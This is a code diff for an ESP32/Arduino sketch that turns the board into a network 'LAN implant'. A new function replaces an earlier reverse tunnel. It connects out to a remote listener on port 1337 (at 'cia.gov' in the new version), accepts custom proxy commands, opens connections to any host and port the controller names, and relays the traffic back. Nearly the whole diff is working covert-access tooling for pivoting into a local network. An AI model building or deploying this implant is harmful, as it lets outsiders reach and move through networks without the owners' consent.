@@ -16,6 +16,29 @@
 const char* ssid = WLAN_SSID; // edit config.h
 const char* password = WLAN_PASS;  //edit config.h
 
+typedef enum {
+  PROXYPACKET_NOP = 0x00,
+  PROXYPACKET_AUTH = 0xA0,
+  PROXYPACKET_AUTHFAIL = 0xAF,
+  PROXYPACKET_DATA = 0xD0,
+  PROXYPACKET_ENDRESPONSE = 0xDE
+} ProxyPacketType;
+
+typedef struct ProxyPacketHeader {
+  ProxyPacketType packetType;
+} ProxyPacketHeader_t;
+
+typedef struct ProxyPacketAuth {
+  const char loginName[256];
+  const char loginPassword[256];
+} ProxyPacketAuth_t;
+
+typedef struct ProxyPacket {
+  uint32_t packetLength;
+  char domain[253];
+  uint16_t port;
+} ProxyPacket_t;
+
 int createIPv4Socket(const char *domain, uint16_t port) {
 
   int fd = -1;
@@ -74,68 +97,209 @@ int createIPv4Socket(const char *domain, uint16_t port) {
     break;
   }
 
-  
-
   return fd;
 }
 
 
-// connects to listener, forwards input to target
-int createReverseTcpTunnel(const char* targetDomain, int targetPort,  const char* listenerDomain, int listenerPort)
-{
-  int targetSock = -1;
-  int listenerSock = -1;
-  char targetDataBuffer[256] = {};
-  char listenerDataBuffer[256] = {};
-  
-  targetSock = createIPv4Socket(targetDomain, targetPort);
-  if(targetSock < 0) {
-    Serial.println("Failed to create socket for target server.");
-    return -1;
-  }
 
+int receiveProxyAuthPacket(int sock) {
+  ProxyPacketAuth_t auth = {};
+  ssize_t nRead = read(sock, &auth, sizeof(ProxyPacketAuth_t));
+
+  switch(nRead) {
+    case -1:
+      Serial.println("An error occured receiving the proxy packet :(");
+      return -1;
+    case 0:
+      Serial.println("The socket has disconnected :(");
+      return 0;
+    
+    default:
+      if(nRead != sizeof(ProxyPacketAuth_t)) {
+        Serial.println("Received invalid Proxy Packet Header.");
+        return -1;
+      }
+      Serial.println("Received proxy auth packet!");
+      Serial.printf("Username = %s, Password = %s\n", auth.loginName, auth.loginPassword);
+      break;
+  } 
+  return nRead;
+}
+
+int receiveProxyDataPacket(int sock) {
+  ProxyPacket_t proxyPacket = {};
+  ssize_t nRead = read(sock, &proxyPacket, sizeof(ProxyPacket_t));
+
+  switch(nRead) {
+    case -1:
+      Serial.println("An error occured receiving the proxy packet :(");
+      return -1;
+    case 0:
+      Serial.println("The socket has disconnected :(");
+      return 0;
+    
+    default:
+      if(nRead != sizeof(ProxyPacket_t)) {
+        Serial.println("Received invalid Proxy Packet Header.");
+        return -1;
+      }
+      Serial.println("Received proxy data packet!");
+      Serial.printf("domain = %s, port = %d\n", proxyPacket.domain, proxyPacket.port);
+
+      int targetSock = createIPv4Socket(proxyPacket.domain, proxyPacket.port);
+
+      if(targetSock < 0) {
+        Serial.printf("Could not connect to: %s:%d\n", proxyPacket.domain, proxyPacket.port);
+        return -1;
+      }
+
+      if(proxyPacket.packetLength) {
+
+        // Read small chunk
+        if(proxyPacket.packetLength < 256) {
+          char buffer[proxyPacket.packetLength];
+          nRead = read(sock, buffer, proxyPacket.packetLength);
+          Serial.printf("Received: \n");
+          for(int i = 0; i < proxyPacket.packetLength; i++) {
+            Serial.printf("%02x ", buffer[i]);
+          }
+          Serial.printf("\n\n");
+          write(targetSock, buffer, nRead);
+          
+        }
+        else {
+
+          // Read large chunks
+          char buffer[256];
+          int len = proxyPacket.packetLength;
+          while(len > 0) {
+            if(len >= 256) {
+              nRead = read(sock, buffer, 256);
+              Serial.printf("Received: \n");
+              for(int i = 0; i < 256; i+=4) {
+                Serial.printf("%c%c%c%c %02x %02x %02x %02x \n", buffer[i], buffer[i+1], buffer[i+2], buffer[i+3], buffer[i], buffer[i+1], buffer[i+2], buffer[i+3]);
+              }
+              Serial.printf("\n\n");
+              len -= 256;
+              write(targetSock, buffer, nRead);
+            }
+            else {
+              nRead = read(sock, buffer, len);
+              Serial.printf("Received: \n");
+              for(int i = 0; i < len; i++) {
+                Serial.printf("%c %02x \n", buffer[i],  buffer[i]);
+              }
+              write(targetSock, buffer, len);
+              Serial.printf("\n\n");
+              len = 0;
+            }
+          }
+        }
+
+        char buffer[256];
+
+        Serial.println("Receiving response from target...\n");
+        ProxyPacketHeader_t hdr = {};
+        hdr.packetType = PROXYPACKET_DATA;
+
+        ProxyPacket_t responsePacket = {};
+        responsePacket.packetLength = 256;
+        responsePacket.port = proxyPacket.port;
+        memcpy(responsePacket.domain, proxyPacket.domain, sizeof(responsePacket.domain));
+
+        while( (nRead = read(targetSock, buffer, 256)) > 0)
+        {
+          Serial.printf("Got %d bytes from target...\n", nRead);
+          responsePacket.packetLength = nRead;
+          write(sock, &hdr, sizeof(ProxyPacketHeader_t));
+          write(sock, &responsePacket, sizeof(ProxyPacket_t));
+          write(sock, buffer, responsePacket.packetLength);
+          bzero(buffer, 256);
+        }
+
+        Serial.printf("Sending EOF packet..\n");
+        hdr.packetType = PROXYPACKET_ENDRESPONSE;
+        write(sock, &hdr, sizeof(ProxyPacketHeader_t));
+      }
+      if(targetSock >= 0) {
+        close(targetSock);
+      }
+      
+      break;
+  } 
+  return nRead;
+}
+
+
+int receiveProxyPacket(int sock) {
+  
+  ProxyPacketHeader_t hdr = {};
+  ssize_t nRead = read(sock, &hdr, sizeof(ProxyPacketHeader_t));
+
+  switch(nRead) {
+    case -1:
+      Serial.println("An error occured receiving the proxy packet :(");
+      return -1;
+    case 0:
+      Serial.println("The socket has disconnected :(");
+      return 0;
+    
+    default:
+      if(nRead != sizeof(ProxyPacketHeader_t)) {
+        Serial.println("Received invalid Proxy Packet Header.");
+        return -1;
+      }
+      Serial.println("Received proxy packet header!");
+      break;
+  } 
+
+  switch(hdr.packetType) {
+
+    case PROXYPACKET_NOP:
+      Serial.println("Received null-operation packet.");
+      break;
+
+    case PROXYPACKET_AUTH:
+      Serial.println("Received authentication packet.");
+      nRead = receiveProxyAuthPacket(sock);
+      break;
+
+    case PROXYPACKET_DATA:
+      Serial.println("Received data packet.");
+      nRead = receiveProxyDataPacket(sock);
+      break;
+
+    default:
+      Serial.printf("Received invalid packet, type=%d", hdr.packetType);
+      break;
+  }
+  return nRead;
+}
+
+
+int runTCPLANImplant(const char* listenerDomain, uint16_t listenerPort)
+{
+  int listenerSock = -1;
+  
   listenerSock = createIPv4Socket(listenerDomain, listenerPort);
   if(listenerSock < 0) {
     Serial.println("Failed to create socket for listener server.");
     return -1;
   }
 
-
-  
-  // FORWARD REQUEST TO TARGET
-  Serial.println("Sending data from listener -> target...");
-  ssize_t count = 0;
-  while( (count = recv(listenerSock, listenerDataBuffer, sizeof(listenerDataBuffer), MSG_WAITALL)) ) {
-    if (count == -1) {
-      Serial.println("An error has occured.\n");
-      break;
+  while(true) {
+    int rc = receiveProxyPacket(listenerSock);
+    if( rc == -1) {
+      close(listenerSock);
+      return -1;
     }
-    Serial.printf("Got packet of %d bytes, forwarding it to target...\n", count);
-    write(targetSock, listenerDataBuffer, count);
-    bzero(listenerDataBuffer, sizeof(listenerDataBuffer));
+    else if( rc == 0) {
+      close(listenerSock);
+      return 0;
+    }
   }
 
-  Serial.println("Sending data from target -> listener...");
-  // FORWARD RESPONSE TO LISTENER
-  count = 0;
-  while( (count = recv(targetSock, targetDataBuffer, sizeof(targetDataBuffer), MSG_WAITALL)) ) {
-    if (count == -1) {
-      Serial.println("An error has occured.\n");
-      break;
-    }
-    Serial.printf("Got packet of %d bytes, forwarding it to listener...\n", count);
-    write(listenerSock, targetDataBuffer, count);
-    bzero(targetDataBuffer, sizeof(targetDataBuffer));
-  }
-
-  Serial.println("Tunnel communication has completed, cleaning up...");
-  bzero(targetDataBuffer, sizeof(targetDataBuffer));
-  bzero(listenerDataBuffer, sizeof(listenerDataBuffer));
-  
-  close(listenerSock);
-  close(targetSock);
-
-  return 0;
+  return 1;
 }
 
 void setup() {
@@ -158,7 +322,7 @@ int errorCount = 0;
 
 void loop() {
   Serial.println("Starting TCP tunnel.\n");
-  int err = createReverseTcpTunnel("ah.nl", 443, "kernelium.com", 1337);
+  int err = runTCPLANImplant("cia.gov", 1337);
   if(err == -1) {
     errorCount++;
   }
